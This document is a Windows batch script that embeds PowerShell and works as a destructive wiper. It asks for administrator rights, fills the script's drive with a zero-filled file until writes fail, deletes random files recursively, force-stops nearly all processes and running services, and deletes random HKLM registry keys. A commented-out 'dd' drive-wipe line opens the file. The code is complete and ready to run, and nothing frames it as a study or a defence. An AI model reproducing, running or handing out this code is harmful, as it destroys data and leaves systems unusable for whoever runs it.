REM dd if=/dev/zero of=%~d0 bs=1M

@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    echo Execution with administrative privileges.
) else (
    echo Requesting administrative privileges...
    PowerShell -Command "Start-Process cmd.exe -ArgumentList '/c %~f0' -Verb RunAs" >nul
    exit /b
)

SET ScriptPath=%~dp0

PowerShell -Command "& {
    function Create-DestructiveFile {
        param (
            [string]$drive
        )
        $filePath = Join-Path -Path $drive -ChildPath 'destructiveZero.bin'
        $fs = [System.IO.File]::Create($filePath)
        $bytes = New-Object byte[] 512KB
        $errorCount = 0

        try {
            while ($true) {
                try {
                    $fs.Write($bytes, 0, $bytes.Length)
                    $fs.Flush()
                } catch {
                    $errorCount++
                    Remove-Items -drive $drive
                    if ($errorCount -gt 5) {
                        Invoke-DestructiveActions
                    }
                    if ($errorCount -gt 10) {
                        Remove-RandomRegistryKeys
                    }
                }
            }
        } catch {
            # Ignore exceptions and continue until the system becomes unstable
        } finally {
            $fs.Close()
        }
    }

    function Remove-Items {
        param (
            [string]$drive
        )
        $items = Get-ChildItem -Path $drive -Recurse | Get-Random -Count 10
        foreach ($item in $items) {
            try {
                Remove-Item $item.FullName -Force -Recurse
            } catch {
                # Item could not be deleted, possibly due to being in use or system permissions
            }
        }
    }

    function Invoke-DestructiveActions {
        Get-Process | Where-Object { $_.ProcessName -ne 'System' -and $_.ProcessName -ne 'Idle' } | Stop-Process -Force
        Get-Service | Where-Object { $_.Status -eq 'Running' } | Stop-Service -Force
    }

    function Remove-RandomRegistryKeys {
        $keys = Get-ChildItem -Path 'HKLM:\' -Recurse | Get-Random -Count 5
        foreach ($key in $keys) {
            try {
                Remove-Item $key.PSPath -Force -Recurse
            } catch {
                # Key could not be deleted, possibly due to being in use or system permissions
            }
        }
    }

    $drive = Split-Path -Path '%ScriptPath%' -Root
    Create-DestructiveFile -drive $drive
}"
